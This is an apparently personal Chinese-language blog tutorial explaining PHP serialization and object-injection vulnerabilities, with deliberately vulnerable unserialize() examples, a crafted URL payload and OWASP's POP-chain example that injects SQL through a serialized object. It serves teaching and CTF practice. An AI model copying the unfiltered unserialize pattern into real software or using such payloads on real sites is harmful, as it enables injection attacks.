### 简单的PHP反序列化

By @badbird

Time：2020-12-30

---

前言：

​		本文会通过几个例子介绍一下PHP反序列化漏洞的原理和利用方式。

​		阅读本文不需要多强的代码能力，但需要有类和对象的概念。

​		(基础知识，大佬绕行:dog:)

---

#### 什么是[序列化](https://baike.baidu.com/item/%E5%BA%8F%E5%88%97%E5%8C%96/2890184)和反序列化？

​		我将序列化理解为一种规则化。

​		大白话讲，就是使千奇百怪的有各种不同属性的**对象**能以一种**同样的形式**（字符串形式）存储（*序列化*），当使用这个对象的时候，就是用规则的逆向将它**还原**为我们思维中的对象实例（*反序列化*）。下图显示脑海中对一个对象的构图：

![image-20201208162714231](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20201208162714231.png)

创建了一个”男神“类的对象”我“，具有高~~富~~帅三个属性，这就是我们正常思维的样子。

经过大脑处理记忆(规则化)之后就变成什么样子了呢? 

![image-20201208163052523](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20201208163052523.png)

没错，纯文本。（*想想近年来提倡的思维导图记忆法，是一种反序列化吧。*）

由一种抽象化的形式 变成 了一种更简约更具体的字符串的体现形式。

简而言之，对象是抽象的实体，序列化就是对一个对象按照特定规则的**具体描述**。

~~废话说完~~我们来看个简单的PHP代码的例子（==注意变量都是public的==）：

```php
<?php
class God{ 
    public $high = '180'; 
    public $money = '0';
    public $face = '999';
}
$me = new God;
echo serialize($me);
?>
//O:3:"God":3:{s:4:"high";s:3:"180";s:5:"money";s:1:"0";s:4:"face";s:3:"999";}
```

由此我们可以得到PHP中序列化后的字符串格式：

```php
O:<length>:"<class name>":<n>:{<field name 1>;<field value 1>;...;<field name n>;<field value n>} 
```

其中

- O表示(object)整个字符串是一个**对象**的序列化；
- n代表这个对象的**属性个数**；
- 所有属性由{}包裹；
- <field name 1>表示 **属性名**  例如：s:4:"high"；
  - s:4:表示” “中是四个字符的字符串
- <field value 1>表示 **属性值**  例如：s:3:"180"；
- 所有属性的各项（*属性名和属性值为不同项*）由**”;“**隔开。

**上边的例子所设的变量都是public的，那么private的呢？区别如下**：

```php
<?php
class God{ 
    private $high = '180'; 
    private $money = '0';
    private $face = '999';
}
$me = new God;
echo serialize($me);
?>
//O:3:"God":3:{s:9:"Godhigh";s:3:"180";s:10:"Godmoney";s:1:"0";s:9:"Godface";s:3:"999";}
```

发现有个小问题，明明长度是7的Godhigh，在序列化中却显示其长度为9？多了俩啥？

使用了个[在线php工具](http://www.dooccn.com/php/)

![image-20201209172608716](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20201209172608716.png)

发现输出在God（也就是类名）两边有奇怪的小方框。为解疑惑，在cmd里面尝试输出一下：

![image-20201209173322353](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20201209173322353.png)

破案了，空字符(肯定不是空格，如果是空格的话没理由之前显示不出来，只能是空，四大皆空的空)

根据PHP官方文档的解释(大佬查的)：

> 对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上'*'。这些前缀值在任一侧都有空字节。

这就要求我们如果要构造该序列化字符串时，需要补齐这两个空字节

```php
O:3:"God":3:{s:9:"%00God%00high";s:3:"180";s:10:"%00God%00money";s:1:"0";s:9:"%00God%00face";s:3:"999";}
```



序列化是啥东西知道了，那么反序列化呢？

~~敷衍一下，反过来就是了：字符串->对象~~ 		**往下看。**

---

#### 反序列化漏洞的原理

反序列化漏洞产生原因：

- **unserialize()传入的参数可控**是主要原因
- unserialize()传入的参数无过滤(过滤被绕过)
- PHP类中的魔法函数自动调用

先上一个简单的例子：

```php
<?php
class demo{
    public $words = 'Good man';
    public function __destruct(){
        echo $this->words;
    }
}
$you = new demo;
if(isset($_GET['data'])){
    $other = $_GET['data'];
    $me = unserialize($other);
}
?>
//输出：Good man
```

但是由于存在unserialize()函数且其参数是用户可控的，无任何过滤，我们可以构造如下EXP：

```php
<?php
class demo{
    public $words = 'HACKKKKKK';
}
$evil = serialize(new demo);
echo $evil;
?>
//O:4:"demo":1:{s:5:"words";s:9:"HACKKKKKK";}
```

在URL中直接将该输出赋给data变量，构造payload：

```
?data=O:4:%22demo%22:1:{s:5:%22words%22;s:9:%22HACKKKKKK%22;}
```

轻轻点一下回车就可以看到HACKKKKKK被输出了。

![image-20201209192010410](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20201209192010410.png)

总结一下就是一句话：

- 反序列化使用户可自定义某个类的对象以达到任意执行类中魔法函数内的操作。

再看一个相似的__wakeup()（执行unserialize()时，先会调用这个函数）的简单例子了解一下什么是数据流。

```php
<?php
class demo{
    public $words = "Good man";
    public function __wakeup()
    {
        $this->evil($this->words);
    }
    public function evil($words){
        echo $words;
    }
}
$you = new demo;
unserialize(serialize($you));
?>
//?hack=O:4:%22demo%22:1:{s:5:%22words%22;s:9:%22HACKKKKKK%22;}
//HACKKKKKK
```

这段正常的代码显示了一个简单的**数据传输流**：unserialize() 调用 __wakeup 调用 类自定义的方法evil()，其中"HACKKKKKK"先由$this->words 调用 传给evil()函数 再 由其输出。

---

#### POP链

我所理解的pop chain在逻辑上很简单。它的复杂程度和代码的复杂程度直接关联，但实际上就是**变量或函数的间接调用**

这里应用[owasp](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)上的一个例子：

```php
class Example3
{
   protected $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
}
// some PHP code...
$user_data = unserialize($_POST['data']);
// some PHP code...
```

这段代码的作用是：如果user_data是Example3的对象且将被视为代码中某处的字符串的时候，会自动调用它的__toString()方法，其又调用了user_data的obj属性中存储的getValue()方法。

```php
class SQL_Row_Value
{
   private $_table;
   // some PHP code...
   function getValue($id)
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
      $result = mysql_query($sql, $DBFactory::getConnection());
      $row = mysql_fetch_assoc($result);

      return $row['value'];
   }
}
```

这段代码实现了查询数据库的功能，其关键的查询语句为$sql保存的字符串，而其中拼接的关键字符串来源于$_table属性，所以我们可以想办法自定义其值来达到任意查询数据库的目的。

exploit:

```php
class SQL_Row_Value
{
   private $_table = "SQL Injection";
}
class Example3
{
   protected $obj;

   function __construct()
   {
      $this->obj = new SQL_Row_Value;
   }
}
print urlencode(serialize(new Example3));
//O:8:"Example3":1:{s:6:"*obj";O:13:"SQL_Row_Value":1:{s:21:"SQL_Row_Value_table";s:13:"SQL Injection";}}
```

该代码利用的正是__toString()方法

```
   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
```

利用构造函数实例化Example3并将SQL_Row_Value的对象存储到Example3的$obj属性中。

这样我们就可以在"SQL Injection"中随意填写我们想使用的SQL语句了。

最后得到的序列化字符串中包含的信息为：Example3的对象，其obj属性中存有SQL_Row_Value的对象，SQL_Row_Value的对象的_table属性，而\_table属性存放着我们的自定义SQL语句。

---

#### 总结

- 序列化是一种规则化，将复杂和不同以一种特定的规则转变为相似结构的字符串。
- 反序列化可以让我们构造具有特定属性和方法的对象实例
- 对于各种魔术方法比如\__wakeup、__toString的了解建议下载个php手册方便检索学习
- 练习简单的反序列化漏洞可以从各CTF平台做做题。
- 进阶学习反序列化漏洞就可以找找大项目已爆出的漏洞，跟着大佬的复现过程学习即可。

---

#### 后感

写到后面感觉有点迷糊了，可能是时间跨度大的原因，墨迹了半个多月才勉强搞完。

这篇文章的个人感觉是非常对小白友好的，看完能达到从不知道到了解的进步。

总之学海无涯，这也是我第一篇从自己思考出发写的小文章。如有错误感谢指正修改！

**附喜欢的一句话：**

<center>不必等候炬火</center>

